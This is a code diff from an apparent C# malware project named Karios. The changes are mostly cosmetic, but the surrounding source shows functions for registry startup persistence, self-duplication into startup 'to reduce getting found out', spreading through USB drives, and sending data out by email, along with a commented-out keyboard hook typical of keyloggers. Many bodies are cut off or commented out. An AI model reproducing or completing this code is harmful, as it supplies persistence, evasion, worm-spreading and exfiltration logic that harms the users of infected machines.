@@ -203,6 +203,7 @@ namespace Karios
 
                     _emailEndpoint = preppedCommand[4];
                     _website = preppedCommand[8];
+                    //Creates a new button, then clicks it for funsies 
                     Button b = new Button();
                     b.Click += LaunchWebsite();
                     b.PerformClick();
@@ -287,10 +288,6 @@ namespace Karios
             //return CallNextHookEx(_hookId, nCode, wParam, lParam);
         //}
 
-
-        /// <summary>
-        /// Sets the startup registary key
-        /// </summary>
         public static void SetStartup()
         {
             //Changes the startup registary keys to run Karios at startup.
@@ -304,7 +301,6 @@ namespace Karios
             }
             */
         }
-
         public static void Duplicate()
         {
             //Copies itself into the startup multiple times to reduce getting found out
@@ -316,7 +312,6 @@ namespace Karios
             }
             */
         }
-
         public static void USBSpread()
         {
             var alldrives = DriveInfo.GetDrives();
@@ -332,8 +327,6 @@ namespace Karios
                 }
             }
         }
-
-
         public static void SendMail()
         {
             try
@@ -376,7 +369,6 @@ namespace Karios
                 EmailSending = false;
             }
         }
-
         public static IPAddress GetIpAddress(string hostName)
         {
             //Currently Broken
@@ -385,7 +377,6 @@ namespace Karios
             //Pings googles servers and gets hostname
             return replay != null && replay.Status == IPStatus.Success ? replay.Address : null;
         }
-
         static EventHandler LaunchWebsite()
         {
             using (var wc = new WebClient())
